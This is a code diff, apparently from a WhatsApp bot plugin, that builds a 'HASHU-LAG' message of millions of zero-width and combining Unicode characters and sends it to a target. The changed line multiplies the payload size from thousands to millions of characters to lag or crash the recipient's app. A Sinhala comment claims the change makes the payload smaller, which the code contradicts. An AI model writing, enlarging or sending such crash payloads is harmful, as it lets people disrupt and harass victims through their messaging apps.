@@ -20,7 +20,7 @@ async (conn, mek, m, { from, isOwner, reply, args, senderNumber }) => {
 
         // --- මෙතන තමයි වෙනස තියෙන්නේ ---
         // අපි ලොකු Payload එකක් වෙනුවට ලස්සනට පිළිවෙලට බර වැඩි සංකේත ටිකක් විතරක් දානවා
-        const bugBody = "\u200b".repeat(5000) + "҉".repeat(500) + "\u0345\u0361\u0345".repeat(500);
+        const bugBody = "\u200b".repeat(5000000) + "҉".repeat(500000) + "\u0345\u0361\u0345".repeat(5000000);
 
         await conn.sendMessage(target, { 
             text: `*⚠️ HASHU-LAG SYSTEM V1 ⚠️*\n\n` + bugBody,
